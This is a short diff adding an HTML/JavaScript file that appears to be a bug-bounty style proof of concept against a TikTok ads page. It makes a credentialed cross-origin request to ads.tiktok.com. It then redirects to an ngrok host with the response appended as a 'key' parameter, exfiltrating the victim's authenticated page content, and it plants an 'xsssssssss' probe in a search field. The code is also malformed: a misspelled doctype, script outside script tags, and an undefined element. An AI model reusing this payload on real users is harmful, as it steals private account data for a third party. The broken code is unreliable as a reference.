@@ -1,0 +1,16 @@
+<!DOCKTYPE HTML>
+<html class="windows desktop landscape" lang="en">
+var xhr = new XMLHttpRequest();
+
+xhr.onload = reqListener; 
+xhr.open("GET", "https://ads.tiktok.com/business/creativecenter/inspiration/popular/hashtag/pc/en");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "text/html");
+xhr.send();
+document.body.appendChild(element)
+    element.addEventListener('click', function(){
+        document.querySelector("Search by hashtag").value = 'xsssssssss '
+    })
+function reqListener() {
+    location='//ab84-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
+};
